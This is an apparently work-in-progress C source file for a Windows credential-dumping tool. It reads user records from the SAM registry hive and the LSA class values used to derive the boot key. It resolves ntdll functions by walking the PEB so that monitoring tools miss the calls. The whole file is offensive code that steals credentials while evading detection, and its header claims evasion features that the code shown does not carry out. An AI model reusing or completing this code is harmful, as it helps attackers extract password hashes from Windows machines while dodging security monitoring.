// Peter Gabaldon. https://pgj11.com/.
// Dumping SAM with clean indirect syscalls, custom call stacks, API hashing and walking PEB. Thanks to this resources
// https://github.com/Maldev-Academy/HellHall
// https://0xdarkvortex.dev/proxying-dll-loads-for-hiding-etwti-stack-tracing/
// https://0xdarkvortex.dev/hiding-in-plainsight/
// https://0xpat.github.io/Malware_development_part_4/

//#define _CRT_SECURE_NO_WARNINGS

#include <Windows.h>
#include <winternl.h>
#include <BaseTsd.h>
#include <ntstatus.h>
#include <comdef.h>
#include <string.h>

#include "main.h"

// Globals "myFuncs"
myMessageBox pMyMessageBox;
myNtOpenKey pMyNtOpenKey;
myNtQueryKey pMyNtQueryKey;
myNtEnumerateKey pMyNtEnumerateKey;
myNtQueryValueKey pMyNtQueryValueKey;
myNtEnumerateValueKey pMyNtEnumerateValueKey;
myNtClose pMyNtClose;
myRtlInitUnicodeString pMyRtlInitUnicodeString;


// Get Address from Export in module by walking PEB. Thus, not calling GetModuleHandle + GetProcAddress.
FARPROC myGetProcAddress(PCHAR moduleName, PCHAR exportName) {
	PCHAR moduleMayus = (PCHAR)HeapAlloc(GetProcessHeap(), 0, strlen(moduleName) + 1);
	strncpy_s(moduleMayus, strlen(moduleName) + 1, moduleName, _TRUNCATE);
	CharUpperA(moduleMayus);

	PPEB pPEB = (PPEB)__readgsqword(0x60);
	PPEB_LDR_DATA pLoaderData = pPEB->Ldr;
	PLIST_ENTRY listHead = &pLoaderData->InMemoryOrderModuleList;
	PLIST_ENTRY listCurrent = listHead->Flink;
	PVOID moduleAddress = NULL;
	do
	{
		PLDR_DATA_TABLE_ENTRY dllEntry = CONTAINING_RECORD(listCurrent, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
		DWORD dllNameLength = WideCharToMultiByte(CP_ACP, 0, dllEntry->FullDllName.Buffer, dllEntry->FullDllName.Length, NULL, 0, NULL, NULL);
		PCHAR dllName = (PCHAR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dllNameLength);
		WideCharToMultiByte(CP_ACP, 0, dllEntry->FullDllName.Buffer, dllEntry->FullDllName.Length, dllName, dllNameLength, NULL, NULL);
		CharUpperA(dllName);
		if (strstr(dllName, moduleMayus))
		{
			moduleAddress = dllEntry->DllBase;
			HeapFree(GetProcessHeap(), 0, dllName);
			break;
		}
		HeapFree(GetProcessHeap(), 0, dllName);
		listCurrent = listCurrent->Flink;
	} while (listCurrent != listHead);

	if (moduleAddress == NULL) {
		return NULL;
	}

	PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)moduleAddress;
	PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)((PBYTE)moduleAddress + pDosHeader->e_lfanew);
	PIMAGE_OPTIONAL_HEADER pOptionalHeader = (PIMAGE_OPTIONAL_HEADER) & (pNtHeader->OptionalHeader);
	PIMAGE_EXPORT_DIRECTORY pExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)moduleAddress + pOptionalHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
	PULONG pAddressOfFunctions = (PULONG)((PBYTE)moduleAddress + pExportDirectory->AddressOfFunctions);
	PULONG pAddressOfNames = (PULONG)((PBYTE)moduleAddress + pExportDirectory->AddressOfNames);
	PUSHORT pAddressOfNameOrdinals = (PUSHORT)((PBYTE)moduleAddress + pExportDirectory->AddressOfNameOrdinals);

	FARPROC found = NULL;

	for (unsigned int i = 0; i < pExportDirectory->NumberOfNames; ++i) {
		PCSTR pFunctionName = (PSTR)((PBYTE)moduleAddress + pAddressOfNames[i]);
		if (strcmp(pFunctionName, exportName) == 0)
		{
			found = (FARPROC)((PBYTE)moduleAddress + pAddressOfFunctions[pAddressOfNameOrdinals[i]]);
		}
	}
	HeapFree(GetProcessHeap(), 0, moduleMayus);

	return found;
}

/*
* NtOpenKey -> RegOpenKey, RegOpenKeyEx
* NtQueryKey -> RegQueryInfoKey
* NtEnumerateKey -> RegEnumerateKey, RegEnumerateKeyEx, RegEnumKey, RegEnumKeyEx
* NtQueryValueKey -> RegQueryValue, RegQueryValueEx
* NtEnumerateValueKey -> RegEnumValue
*
*/
void getSAM(PSAM samRegEntries[], PULONG len) {
	HANDLE key;
	HANDLE subKey;
	OBJECT_ATTRIBUTES attributes;
	OBJECT_ATTRIBUTES attributesSubKey;
	UNICODE_STRING UnicodeRegPath;
	UNICODE_STRING UnicodeRegPathSubKey;
	ULONG lengthBuff;
	PKEY_FULL_INFORMATION keyInfo = NULL;
	PKEY_FULL_INFORMATION keyInfoSubKey = NULL;
	PKEY_BASIC_INFORMATION keyInfoSubKeysBasic = NULL;
	PKEY_VALUE_FULL_INFORMATION keyValuesSubKey = NULL;
	WCHAR RegPath[MAX_PATH] = L"\\Registry\\Machine\\SAM\\SAM\\Domains\\Account\\Users";
	DWORD maxLenOfNames;
	ULONG nEntries = 0;
	PSAM sams[MAX_SAM_ENTRIES];

	DWORD ret;

	pMyRtlInitUnicodeString(&UnicodeRegPath, RegPath);
	InitializeObjectAttributes(&attributes, &UnicodeRegPath, OBJ_CASE_INSENSITIVE, NULL, NULL);

	ret = pMyNtOpenKey(&key, KEY_READ, &attributes);

	if (!NT_SUCCESS(ret)) {
		exit(ret);
	}

	ret = pMyNtQueryKey(key, KeyFullInformation, NULL, 0, &lengthBuff);

	keyInfo = (PKEY_FULL_INFORMATION)HeapAlloc(GetProcessHeap(), 0, lengthBuff);

	ret = pMyNtQueryKey(key, KeyFullInformation, keyInfo, lengthBuff, &lengthBuff);

	if (!NT_SUCCESS(ret)) {
		exit(ret);
	}


	for (ULONG i = 0; i < keyInfo->SubKeys; i++) {
		maxLenOfNames = MAX_KEY_LENGTH;

		ret = pMyNtEnumerateKey(key, i, KeyBasicInformation, NULL, 0, &lengthBuff);

		keyInfoSubKeysBasic = (PKEY_BASIC_INFORMATION)HeapAlloc(GetProcessHeap(), 0, lengthBuff);

		ret = pMyNtEnumerateKey(key, i, KeyBasicInformation, keyInfoSubKeysBasic, lengthBuff, &lengthBuff);

		if (!NT_SUCCESS(ret)) {
			exit(ret);
		}

		if (wcsncmp(L"00", keyInfoSubKeysBasic->Name, wcslen(L"00")) == 0) {
			WCHAR RegPathSubKey[MAX_PATH] = L"\\Registry\\Machine\\SAM\\SAM\\Domains\\Account\\Users\\";
			wcsncat_s(RegPathSubKey, MAX_PATH, keyInfoSubKeysBasic->Name, _TRUNCATE);

			pMyRtlInitUnicodeString(&UnicodeRegPathSubKey, RegPathSubKey);
			InitializeObjectAttributes(&attributesSubKey, &UnicodeRegPathSubKey, OBJ_CASE_INSENSITIVE, NULL, NULL);

			ret = pMyNtOpenKey(&subKey, KEY_READ, &attributesSubKey);

			if (!NT_SUCCESS(ret)) {
				exit(ret);
			}

			ret = pMyNtQueryKey(subKey, KeyFullInformation, NULL, 0, &lengthBuff);

			keyInfoSubKey = (PKEY_FULL_INFORMATION)HeapAlloc(GetProcessHeap(), 0, lengthBuff);

			ret = pMyNtQueryKey(subKey, KeyFullInformation, keyInfoSubKey, lengthBuff, &lengthBuff);

			if (!NT_SUCCESS(ret)) {
				exit(ret);
			}

			PSAM sam = (PSAM)HeapAlloc(GetProcessHeap(), NULL, sizeof(SAM));
			wcscpy_s(sam->rid, keyInfoSubKeysBasic->NameLength, keyInfoSubKeysBasic->Name);

			getClasses(sam);

			for (ULONG j = 0; j < keyInfoSubKey->Values; j++) {
				ret = pMyNtEnumerateValueKey(subKey, j, KeyValueFullInformation, NULL, 0, &lengthBuff);

				keyValuesSubKey = (PKEY_VALUE_FULL_INFORMATION)HeapAlloc(GetProcessHeap(), 0, lengthBuff);

				ret = pMyNtEnumerateValueKey(subKey, j, KeyValueFullInformation, keyValuesSubKey, lengthBuff, &lengthBuff);

				if (!NT_SUCCESS(ret)) {
					exit(ret);
				}

				if (wcsncmp(keyValuesSubKey->Name, L"V", keyValuesSubKey->NameLength) == 0) {
					PVOID data = (PVOID)((ULONG_PTR)keyValuesSubKey + keyValuesSubKey->DataOffset);
					CopyMemory(sam->v, data, keyValuesSubKey->DataLength);
					sam->vLen = keyValuesSubKey->DataLength;
				}

				if (wcsncmp(keyValuesSubKey->Name, L"F", keyValuesSubKey->NameLength) == 0) {
					PVOID data = (PVOID)((ULONG_PTR)keyValuesSubKey + keyValuesSubKey->DataOffset);
					CopyMemory(sam->f, data, keyValuesSubKey->DataLength);
					sam->fLen = keyValuesSubKey->DataLength;
				}
				HeapFree(GetProcessHeap(), 0, keyValuesSubKey);
			}
			sams[nEntries] = sam;
			nEntries++;
			HeapFree(GetProcessHeap(), 0, keyInfoSubKey);
			pMyNtClose(subKey);
		}
		HeapFree(GetProcessHeap(), 0, keyInfoSubKeysBasic);
	}

	HeapFree(GetProcessHeap(), 0, keyInfo);
	pMyNtClose(key);

	ULONG lenRet = nEntries * sizeof(SAM);
	CopyMemory(len, &lenRet, sizeof(ULONG));
	if (samRegEntries != NULL) {
		for (ULONG i = 0; i < nEntries; i++) {
			CopyMemory(samRegEntries[i], sams[i], sizeof(SAM));
			HeapFree(GetProcessHeap(), 0, sams[i]);
		}
	}
}


// TODO

void strToKey(PWCHAR s, PBYTE keyRet) {
	WCHAR result[STR_TO_KEY_LEN] = {};

	BYTE oddParity[] = { 0x1, 0x1, 0x2, 0x2, 0x4, 0x4, 0x7, 0x7, 0x8, 0x8, 0xb, 0xb, 0xd, 0xd, 0xe, 0xe, 0x10, 0x10, 0x13, 0x13, 0x15, 0x15, 0x16, 0x16, 0x19, 0x19, 0x1a, 0x1a, 0x1c, 0x1c, 0x1f, 0x1f, 0x20, 0x20, 0x23, 0x23, 0x25, 0x25, 0x26, 0x26, 0x29, 0x29, 0x2a, 0x2a, 0x2c, 0x2c, 0x2f, 0x2f, 0x31, 0x31, 0x32, 0x32, 0x34, 0x34, 0x37, 0x37, 0x38, 0x38, 0x3b, 0x3b, 0x3d, 0x3d, 0x3e, 0x3e, 0x40, 0x40, 0x43, 0x43, 0x45, 0x45, 0x46, 0x46, 0x49, 0x49, 0x4a, 0x4a, 0x4c, 0x4c, 0x4f, 0x4f, 0x51, 0x51, 0x52, 0x52, 0x54, 0x54, 0x57, 0x57, 0x58, 0x58, 0x5b, 0x5b, 0x5d, 0x5d, 0x5e, 0x5e, 0x61, 0x61, 0x62, 0x62, 0x64, 0x64, 0x67, 0x67, 0x68, 0x68, 0x6b, 0x6b, 0x6d, 0x6d, 0x6e, 0x6e, 0x70, 0x70, 0x73, 0x73, 0x75, 0x75, 0x76, 0x76, 0x79, 0x79, 0x7a, 0x7a, 0x7c, 0x7c, 0x7f, 0x7f, 0x80, 0x80, 0x83, 0x83, 0x85, 0x85, 0x86, 0x86, 0x89, 0x89, 0x8a, 0x8a, 0x8c, 0x8c, 0x8f, 0x8f, 0x91, 0x91, 0x92, 0x92, 0x94, 0x94, 0x97, 0x97, 0x98, 0x98, 0x9b, 0x9b, 0x9d, 0x9d, 0x9e, 0x9e, 0xa1, 0xa1, 0xa2, 0xa2, 0xa4, 0xa4, 0xa7, 0xa7, 0xa8, 0xa8, 0xab, 0xab, 0xad, 0xad, 0xae, 0xae, 0xb0, 0xb0, 0xb3, 0xb3, 0xb5, 0xb5, 0xb6, 0xb6, 0xb9, 0xb9, 0xba, 0xba, 0xbc, 0xbc, 0xbf, 0xbf, 0xc1, 0xc1, 0xc2, 0xc2, 0xc4, 0xc4, 0xc7, 0xc7, 0xc8, 0xc8, 0xcb, 0xcb, 0xcd, 0xcd, 0xce, 0xce, 0xd0, 0xd0, 0xd3, 0xd3, 0xd5, 0xd5, 0xd6, 0xd6, 0xd9, 0xd9, 0xda, 0xda, 0xdc, 0xdc, 0xdf, 0xdf, 0xe0, 0xe0, 0xe3, 0xe3, 0xe5, 0xe5, 0xe6, 0xe6, 0xe9, 0xe9, 0xea, 0xea, 0xec, 0xec, 0xef, 0xef, 0xf1, 0xf1, 0xf2, 0xf2, 0xf4, 0xf4, 0xf7, 0xf7, 0xf8, 0xf8, 0xfb, 0xfb, 0xfd, 0xfd, 0xfe, 0xfe };

	BYTE key[8] = {};

	key[0] = s[0] << 1;
	key[1] = ((s[0] & 0x1) >> 6) | (s[1] << 2);
	key[2] = ((s[1] & 0x3) >> 5) | (s[2] << 3);
	key[3] = ((s[2] & 0x7) >> 4) | (s[3] << 4);
	key[4] = ((s[3] & 0xf) >> 3) | (s[4] << 5);
	key[5] = ((s[4] & 0x1f) >> 2) | (s[5] << 6);
	key[6] = ((s[5] & 0x3f) >> 1) | (s[6] << 7);
	key[7] = s[6] & 0x7f;

	key[0] = oddParity[(key[0] >> 1)];
	key[1] = oddParity[(key[1] >> 1)];
	key[2] = oddParity[(key[2] >> 1)];
	key[3] = oddParity[(key[3] >> 1)];
	key[4] = oddParity[(key[4] >> 1)];
	key[5] = oddParity[(key[5] >> 1)];
	key[6] = oddParity[(key[6] >> 1)];
	key[7] = oddParity[(key[7] >> 1)];

	CopyMemory(keyRet, key, 8);

	return;
}

void getClasses(PSAM samRegEntry) {
	WCHAR sJD[] = { L'J',L'D', L'\0' };
	WCHAR sSkew1[] = { L'S',L'k',L'e',L'w',L'1', L'\0' };
	WCHAR sGBG[] = { L'G',L'B',L'G', L'\0' };
	WCHAR sData[] = { L'D',L'a',L't',L'a', L'\0' };

	PWCHAR sAll[4] = { sJD, sSkew1, sGBG, sData };

	WCHAR Reg[] = L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\";

	WCHAR resul[MAX_KEY_VALUE_LENGTH] = L"\0";

	HANDLE key;
	OBJECT_ATTRIBUTES attributes;
	UNICODE_STRING UnicodeRegPath;
	PKEY_FULL_INFORMATION keyInfo;
	DWORD lengthBuff;

	DWORD ret;

	for (int i = 0; i < 4; i++) {
		WCHAR RegAux[MAX_PATH] = L"\0";

		wcscpy_s(RegAux, MAX_PATH, Reg);
		wcsncat_s(RegAux, MAX_PATH, sAll[i], _TRUNCATE);

		pMyRtlInitUnicodeString(&UnicodeRegPath, RegAux);
		InitializeObjectAttributes(&attributes, &UnicodeRegPath, OBJ_CASE_INSENSITIVE, NULL, NULL);

		ret = pMyNtOpenKey(&key, KEY_READ, &attributes);

		if (!NT_SUCCESS(ret)) {
			exit(ret);
		}

		ret = pMyNtQueryKey(key, KeyFullInformation, NULL, 0, &lengthBuff);

		keyInfo = (PKEY_FULL_INFORMATION)HeapAlloc(GetProcessHeap(), 0, lengthBuff);

		ret = pMyNtQueryKey(key, KeyFullInformation, keyInfo, lengthBuff, &lengthBuff);

		if (!NT_SUCCESS(ret)) {
			exit(ret);
		}

		PWCHAR data = (PWCHAR)((ULONG_PTR)keyInfo + keyInfo->ClassOffset);

		PWCHAR aux = (PWCHAR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, keyInfo->ClassLength);

		CopyMemory(aux, data, keyInfo->ClassLength);
		wcsncat_s(resul, MAX_KEY_VALUE_LENGTH, aux, _TRUNCATE);

		HeapFree(GetProcessHeap(), 0, keyInfo);
		HeapFree(GetProcessHeap(), 0, aux);

		pMyNtClose(key);
	}
	wcscpy_s(samRegEntry->classes, MAX_KEY_VALUE_LENGTH, resul);

	return;
}

void getBootKey(PSAM samRegEntry, int* bootKeyRet) {
	unsigned int magics[16] = { 8,5,4,2,11,9,13,3,0,6,1,12,14,10,15,7 };
	unsigned int bootKey[16];
	for (int i = 0; i < 16; i++) {
		PWCHAR auxStr = (PWCHAR)HeapAlloc(GetProcessHeap(), 0, 3);
		auxStr[0] = samRegEntry->classes[i * 2];
		auxStr[1] = samRegEntry->classes[(i * 2) + 1];
		auxStr[2] = '\0';

		bootKey[i] = wcstol(auxStr, NULL, 16);
	}
	memcpy(bootKeyRet, bootKey, 16);
}

int main(int argc, char** argv) {
	pMyMessageBox = (myMessageBox)myGetProcAddress((PCHAR)"user32.dll", (PCHAR)"MessageBoxA");
	pMyNtOpenKey = (myNtOpenKey)myGetProcAddress((PCHAR)"ntdll.dll", (PCHAR)"NtOpenKey");
	pMyNtQueryKey = (myNtQueryKey)myGetProcAddress((PCHAR)"ntdll.dll", (PCHAR)"NtQueryKey");
	pMyNtEnumerateKey = (myNtEnumerateKey)myGetProcAddress((PCHAR)"ntdll.dll", (PCHAR)"NtEnumerateKey");
	pMyNtQueryValueKey = (myNtQueryValueKey)myGetProcAddress((PCHAR)"ntdll.dll", (PCHAR)"NtQueryValueKey");
	pMyNtEnumerateValueKey = (myNtEnumerateValueKey)myGetProcAddress((PCHAR)"ntdll.dll", (PCHAR)"NtEnumerateValueKey");
	pMyNtClose = (myNtClose)myGetProcAddress((PCHAR)"ntdll.dll", (PCHAR)"NtClose");
	pMyRtlInitUnicodeString = (myRtlInitUnicodeString)myGetProcAddress((PCHAR)"ntdll.dll", (PCHAR)"RtlInitUnicodeString");

	if (pMyMessageBox != NULL) {
		pMyMessageBox(NULL, (LPCTSTR)"TEST", (LPCTSTR)"TEST", MB_OK);
	}

	// Time to debug as always works at first :D
	ULONG len;
	getSAM(NULL, &len);
}